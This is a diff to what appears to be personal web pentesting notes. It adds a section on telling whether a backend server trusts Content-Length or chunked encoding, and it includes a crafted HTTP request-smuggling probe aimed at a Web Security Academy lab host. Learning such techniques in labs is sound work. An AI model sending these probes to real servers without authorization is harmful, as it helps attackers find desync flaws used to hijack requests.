@@ -32,6 +32,21 @@ Content-Length: 27
 {"error":"Invalid request"}
 ```
 ---
+### Identifying if backend is using CE
+send the below request and see the server timeout response from the server
+```
+POST / HTTP/1.1
+Host: 0a9800ec040696b6826d248900930006.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+x
+```
+![Screenshot from 2023-10-31 18-22-58](https://github.com/Sameer484/methodology/assets/110039044/0b867e3e-217f-48ef-b76f-96daea24ba74)
+
 ### use this picture to identify the type of frontend and backend
 
 ![Screenshot from 2023-10-31 18-18-35](https://github.com/Sameer484/methodology/assets/110039044/835c41e8-a5be-4975-a793-29abe1053668)
